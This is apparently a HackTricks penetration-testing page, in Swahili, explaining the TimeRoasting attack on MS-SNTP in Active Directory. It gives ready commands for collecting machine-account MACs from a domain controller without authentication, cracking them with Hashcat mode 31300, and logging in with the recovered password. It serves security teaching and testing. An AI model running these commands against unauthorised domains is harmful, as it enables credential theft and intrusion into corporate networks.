# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting hutumia vibali vya urithi vya MS-SNTP. Client asiye na authentication anaweza kutuma ombi la baiti 68 lenye RID iliyochaguliwa ya akaunti ya kompyuta. Katika njia ya urithi inayoweza kushambuliwa, domain controller hupata authenticator ya response kupitia Netlogon kwa kutumia NT hash ya akaunti ya kompyuta (siri ya password inayotokana na MD4), hivyo kumpa mshambuliaji jozi ya challenge/MAC inayofaa kwa kubashiri password offline (Hashcat mode 31300).<sup>[[1]](#references)[[2]](#references)</sup>

Sehemu ya 3.1.5.1 na 4 za MS-SNTP zinaeleza tabia ya request na response:<sup>[[1]](#references)</sup>
![TimeRoasting: Tazama sehemu ya 3.1.5.1 "Authentication Request Behavior" na 4 "Protocol Examples" katika spec rasmi ya MS-SNTP kwa maelezo](../../images/Pasted%20image%2020250709114508.png)
Wakati `ExtendedAuthenticatorSupported` ni false, request huhifadhi RID katika biti 31 za chini za Key Identifier ya authenticator na biti ya selector katika biti ya juu. Server huthibitisha urefu wa baiti 68, hutoa RID, huomba Netlogon ihesabu checksums za candidate, huchagua moja kwa kutumia biti hiyo ya juu, huweka Key Identifier ya response kuwa sifuri, kisha hurudisha checksum iliyochaguliwa.<sup>[[1]](#references)</sup>

Crypto-checksum inategemea MD5 (tazama 3.2.5.1.1) na inaweza kuvunjwa offline, hivyo kuwezesha shambulio la roasting.<sup>[[1]](#references)</sup>

## Jinsi ya Kushambulia

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Scripts za Timeroasting za Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Mashambulizi ya kivitendo (unauth) kwa NetExec + Hashcat

- Module ya `timeroast` ya NetExec inaweza kuhesabu computer RIDs, kukusanya MS-SNTP MACs bila authentication, na kuchapisha hashes za `$sntp-ms$` zilizo tayari kwa cracking:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline kwa Hashcat mode 31300 (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Maandishi wazi yaliyopatikana yanalingana na nenosiri la akaunti ya computer. Lijaribu moja kwa moja kama akaunti ya machine ukitumia Kerberos (-k) wakati NTLM imezimwa:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
### Maelezo ya kiutendaji
- Hakikisha muda ni sahihi kabla ya kutumia credentials zilizorejeshwa na Kerberos. Pendelea NTP client inayodumishwa kama `chronyd`/`systemd-timesyncd`; `ntpdate` imehifadhiwa hapa kama command ya kawaida ya lab: `sudo ntpdate <dc_fqdn>`.
- Ikihitajika, tengeneza krb5.conf kwa AD realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Map RID kwa principals baadaye kupitia LDAP/BloodHound mara tu unapokuwa na authenticated foothold yoyote.

## References

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – whitepaper ya Timeroasting](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec — source code ya module ya `timeroast`](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../banners/hacktricks-training.md}}
